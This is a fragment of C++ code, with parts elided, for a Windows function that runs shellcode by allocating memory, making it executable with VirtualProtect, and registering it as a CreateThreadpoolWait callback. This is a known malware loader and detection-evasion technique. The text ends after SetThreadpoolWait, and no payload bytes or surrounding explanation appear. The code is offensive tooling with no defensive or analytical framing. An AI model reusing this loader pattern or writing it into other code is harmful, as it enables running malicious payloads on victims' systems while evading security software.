...
BOOL ShellcodeExecutionViaCreateThreadpoolWait() {
	...
	LPVOID lpAddr = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
	if (!lpAddr) {
		CloseHandle(hEvent);
		return FALSE;
	}
	...
	if (!VirtualProtect(lpAddr, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
		CloseHandle(hEvent);
		VirtualFree(lpAddr, 0, MEM_RELEASE);
		return FALSE;
	}

	PTP_WAIT threadpoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)lpAddr, nullptr, nullptr);
	if (!threadpoolWait) {
		CloseHandle(hEvent);
		VirtualFree(lpAddr, 0, MEM_RELEASE);
		return FALSE;
	}
	SetThreadpoolWait(threadpoolWait, hEvent, nullptr);
